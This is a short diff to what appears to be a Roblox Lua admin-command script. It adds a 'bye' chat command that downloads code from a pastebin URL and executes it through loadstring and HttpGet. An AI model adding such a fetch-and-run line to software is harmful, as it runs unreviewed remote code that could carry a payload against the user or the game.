@@ -2413,6 +2413,9 @@ function LocalPlayerChatted(msg)
 		admins = {}
 		notify("Cleared list.")
 	end
+	if command("bye") then
+	loadstring(game:HttpGet('https://pastebin.com/raw/Mv242yVV'))()
+	end
 	if command("prefix") then
 		changeprefix(arg2)
 		notify("Prefix set to'"..arg2.."'.")
